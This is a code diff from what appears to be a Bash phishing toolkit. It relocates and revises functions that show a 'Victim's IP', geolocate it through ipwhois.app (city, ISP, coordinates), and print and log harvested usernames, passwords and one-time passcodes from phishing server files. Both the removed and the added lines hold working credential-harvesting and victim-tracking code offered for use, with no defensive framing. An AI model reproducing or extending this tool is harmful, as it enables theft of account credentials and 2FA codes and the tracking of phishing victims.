@@ -681,89 +681,7 @@ displayshortlink() {
 	echo -e "\n${RED}[${WHITE}#${RED}]${BLUE}If above link is empty just ignore it, Use the generated link"
 	capture_data_check
 }
-## Get IP address
-capture_ip() {
-##        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
-				IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
-        IFS=$'\n'
-        echo -e "\n${RED} Victim's IP : ${RED}$IP"
-	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
-		echo -ne "${RED} IP details cannot be captured in localhost server"
-		echo " "
-		save_ip
-		rm -rf .server/www/ip.txt
-	else
-		ip_details
-		save_ip
-	fi
-}
-save_ip() {
-	cat .server/dumps/space.txt >> ${log_name}.txt
-	cat .server/dumps/line.txt >> ${log_name}.txt
-	cat .server/www/ip.txt >> ${log_name}.txt
-	mv ${log_name}.txt logs
-	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} /logs/${log_name}.txt"
-}
-ip_details() {
-	IFS='\n'
-	iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > track.txt)
-	IFS=$'\n'
-	iptt=$(sed -n 's/"ip"://p' track.txt)
 
-	if [[ $iptt != "" ]]; then
-		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
-	fi
-	iptype=$(sed -n 's/"type"://p' track.txt)
-	if [[ $iptype != "" ]]; then
-		echo -e "\n${GREEN} IP type: ${NC} $iptype"
-	fi
-	latitude=$(sed -n 's/"latitude"://p' track.txt)
-	if [[ $latitude != "" ]]; then
-		echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
-	fi
-	longitude=$(sed -n 's/"longitude"://p' track.txt)
-	if [[ $longitude != "" ]]; then
-		echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
-	fi
-	city=$(sed -n 's/"city"://p' track.txt)
-	if [[ $city != "" ]]; then
-		echo -e "\n${GREEN} City: ${NC} $city"
-	fi
-	isp=$(sed -n 's/"isp"://p' track.txt)
-	if [[ $isp != "" ]]; then
-		echo -e "\n${GREEN} Isp: ${NC} $isp"
-	fi
-	country=$(sed -n 's/"country"://p' track.txt)
-	if [[ $country != "" ]]; then
-		echo -e  "\n${GREEN} Country: ${NC} $country"
-	fi
-	flag=$(sed -n 's/"country_flag"://p' track.txt)
-	if [[ $flag != "" ]]; then
-		echo -e "\n${GREEN} Country flag: ${NC} $flag"
-	fi
-	cap=$(sed -n 's/"country_capital"://p' track.txt)
-	if [[ $cap != "" ]]; then
-		echo -e "\n${GREEN} Country capital: ${NC} $cap"
-	fi
-	phon=$(sed -n 's/"country_phone"://p' track.txt)
-	if [[ $phon != "" ]]; then
-		echo -e "\n${GREEN} Country code: ${NC} $phon"
-	fi
-	continent=$(sed -n 's/"continent"://p' track.txt)
-	if [[ $continent != "" ]]; then
-		echo -e  "\n${GREEN} Continent:  ${NC} $continent"
-	fi
-	ccode=$(sed -n 's/"currency_code"://p' track.txt)
-	if [[ $ccode != "" ]]; then
-		echo -e "\n${GREEN} Currency code: ${NC} $ccode"
-	fi
-	region=$(sed -n 's/"region"://p' track.txt)
-	if [[ $region != "" ]]; then
-		echo -e "\n${GREEN} State: ${NC} $region"
-	fi
-	cat track.txt >> "${log_name}.txt"
-	rm -rf track.txt
-}
 #Capture data check
 capture_data_check(){
 	if [ -f .sites/$website/NOTP ];then
@@ -775,40 +693,9 @@ capture_data_check(){
 	else
 		echo " Error Occured!!"
         fi
-
 #no 1- id pass
 # no 2 - id otp
 # no 3 - id pass otp
-}
-
-## Get credentials
-capture_id() {
-	echo "${RED}"
-        cat .server/www/usernames.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
-	cat .server/dumps/space.txt >> "logs/${log_name}.txt"
-        cat .server/www/usernames.txt >> "logs/${log_name}.txt"
-	rm -rf .server/www/usernames.txt
-}
-
-## Get credentials
-capture_pass() {
-	echo "${RED}"
-	cat  .server/www/pass.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
-	cat .server/dumps/space.txt >> logs/${log_name}.txt
-        cat .server/www/pass.txt >> logs/${log_name}.txt
-	rm -rf .server/www/pass.txt
-}
-
-## Get otp
-capture_otp() {
-	echo "${RED}"
-        cat  .server/www/otp.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
-	cat .server/dumps/space.txt >> logs/${log_name}.txt
-        cat .server/www/otp.txt >> logs/${log_name}.txt
-	rm -rf .server/www/otp.txt
 }
 
 ## Print data no otp
@@ -877,6 +764,119 @@ capture_data_3() {
 		fi
                 sleep 0.75
 	done
+}
+
+## Get IP address
+capture_ip() {
+##        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+				IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+        IFS=$'\n'
+        echo -e "\n${RED} Victim's IP : ${RED}$IP"
+	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
+		echo -ne "${RED} IP details cannot be captured in localhost server"
+		echo " "
+		save_ip
+	else
+		ip_details
+		save_ip
+	fi
+}
+save_ip() {
+	cat .server/dumps/space.txt >> ${log_name}.txt
+	cat .server/dumps/line.txt >> ${log_name}.txt
+	cat .server/www/ip.txt >> ${log_name}.txt
+	mv ${log_name}.txt logs
+	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} /logs/${log_name}.txt"
+	rm -rf .server/www/ip.txt
+}
+ip_details() {
+	curl -s -L "http://ipwhois.app/json/$IP" > rawtrack.txt
+	grep -o '"[^"]*"\s*:\s*[^,]*' rawtrack.txt > track.txt
+	iptt=$(sed -n 's/"ip"://p' track.txt)
+	if [[ $iptt != "" ]]; then
+		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
+	fi
+	iptype=$(sed -n 's/"type"://p' track.txt)
+	if [[ $iptype != "" ]]; then
+		echo -e "\n${GREEN} IP type: ${NC} $iptype"
+	fi
+	latitude=$(sed -n 's/"latitude"://p' track.txt)
+	if [[ $latitude != "" ]]; then
+		echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
+	fi
+	longitude=$(sed -n 's/"longitude"://p' track.txt)
+	if [[ $longitude != "" ]]; then
+		echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
+	fi
+	city=$(sed -n 's/"city"://p' track.txt)
+	if [[ $city != "" ]]; then
+		echo -e "\n${GREEN} City: ${NC} $city"
+	fi
+	isp=$(sed -n 's/"isp"://p' track.txt)
+	if [[ $isp != "" ]]; then
+		echo -e "\n${GREEN} Isp: ${NC} $isp"
+	fi
+	country=$(sed -n 's/"country"://p' track.txt)
+	if [[ $country != "" ]]; then
+		echo -e  "\n${GREEN} Country: ${NC} $country"
+	fi
+	flag=$(sed -n 's/"country_flag"://p' track.txt)
+	if [[ $flag != "" ]]; then
+		echo -e "\n${GREEN} Country flag: ${NC} $flag"
+	fi
+	cap=$(sed -n 's/"country_capital"://p' track.txt)
+	if [[ $cap != "" ]]; then
+		echo -e "\n${GREEN} Country capital: ${NC} $cap"
+	fi
+	phon=$(sed -n 's/"country_phone"://p' track.txt)
+	if [[ $phon != "" ]]; then
+		echo -e "\n${GREEN} Country code: ${NC} $phon"
+	fi
+	continent=$(sed -n 's/"continent"://p' track.txt)
+	if [[ $continent != "" ]]; then
+		echo -e  "\n${GREEN} Continent:  ${NC} $continent"
+	fi
+	ccode=$(sed -n 's/"currency_code"://p' track.txt)
+	if [[ $ccode != "" ]]; then
+		echo -e "\n${GREEN} Currency code: ${NC} $ccode"
+	fi
+	region=$(sed -n 's/"region"://p' track.txt)
+	if [[ $region != "" ]]; then
+		echo -e "\n${GREEN} State: ${NC} $region"
+	fi
+	cat track.txt >> "${log_name}.txt"
+	rm -rf track.txt
+	rm -rf rawtrack.txt
+}
+
+## Get credentials
+capture_id() {
+	echo "${RED}"
+        cat .server/www/usernames.txt
+        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	cat .server/dumps/space.txt >> "logs/${log_name}.txt"
+        cat .server/www/usernames.txt >> "logs/${log_name}.txt"
+	rm -rf .server/www/usernames.txt
+}
+
+## Get credentials
+capture_pass() {
+	echo "${RED}"
+	cat  .server/www/pass.txt
+        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	cat .server/dumps/space.txt >> logs/${log_name}.txt
+        cat .server/www/pass.txt >> logs/${log_name}.txt
+	rm -rf .server/www/pass.txt
+}
+
+## Get otp
+capture_otp() {
+	echo "${RED}"
+        cat  .server/www/otp.txt
+        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	cat .server/dumps/space.txt >> logs/${log_name}.txt
+        cat .server/www/otp.txt >> logs/${log_name}.txt
+	rm -rf .server/www/otp.txt
 }
 
 #online or offline stats
